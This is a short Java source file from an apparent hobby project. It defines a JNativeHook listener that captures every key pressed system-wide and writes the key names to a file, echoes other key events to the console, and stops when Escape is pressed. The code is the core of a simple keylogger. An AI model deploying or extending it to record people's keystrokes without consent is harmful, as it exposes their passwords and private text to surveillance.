import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.BufferedWriter;
import java.io.IOException;

/**
 * Created by Shivi on 19-Aug-16.
 */

// class that will log keyboard keys
public class KeyboardListener implements NativeKeyListener {

    BufferedWriter fw;

    public BufferedWriter getFw() {
        return fw;
    }

    public void setFw(BufferedWriter fw) {
        this.fw = fw;
    }

    public void closeFw() throws IOException {
        fw.close();
    }

    // TODO: log all the output on a file instead of the console
    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
        NativeKeyEvent e = nativeKeyEvent;

        // print the key pressed on the console
        //System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));

        try {
            fw.write(NativeKeyEvent.getKeyText(e.getKeyCode()));
        } catch (IOException e1) {
            e1.printStackTrace();
        }

        // if the key is escape, then exit the program
        // TODO: implement this on cross button also. As well as a close button.
        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
            try {
                GlobalScreen.unregisterNativeHook();
            } catch (NativeHookException ex) {
                System.out.println("There was a problem unregistering the native hook.");
                System.out.println(ex.getMessage());
                //System.exit(1);
            }

        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
        NativeKeyEvent e = nativeKeyEvent;
        System.out.println("Key released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
        NativeKeyEvent e = nativeKeyEvent;
        System.out.println("Key typed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));

    }
}
